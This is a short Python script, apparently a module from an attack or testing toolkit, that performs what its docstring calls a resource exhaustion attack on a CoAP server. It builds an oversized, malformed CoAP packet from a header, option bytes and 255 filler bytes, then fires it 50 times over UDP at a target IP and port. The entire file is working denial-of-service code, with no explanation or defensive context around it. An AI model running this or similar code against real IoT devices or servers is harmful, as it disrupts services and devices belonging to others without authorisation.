import socket

def run(ip: str, port: int, **kwargs) -> dict:
    """
    Resource exhaustion attack on CoAP server - sends multiple large packets
    """
    sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Large CoAP packet with many options
        large_payload = b'\x40\x01\x00\x01\x00'  # Header
        large_payload += b'\xD0\xFF'              # Option delta/length
        large_payload += b'A' * 255               # Large option value
        large_payload += b'\xFF\x00'              # Payload marker
        
        for i in range(50):  # Send 50 packets
            sock.sendto(large_payload, (ip, port))
            sent += 1
            
        return {"success": True, "packets_sent": sent, "port": port}
    except Exception as e:
        return {"success": False, "error": str(e), "sent": sent, "port": port}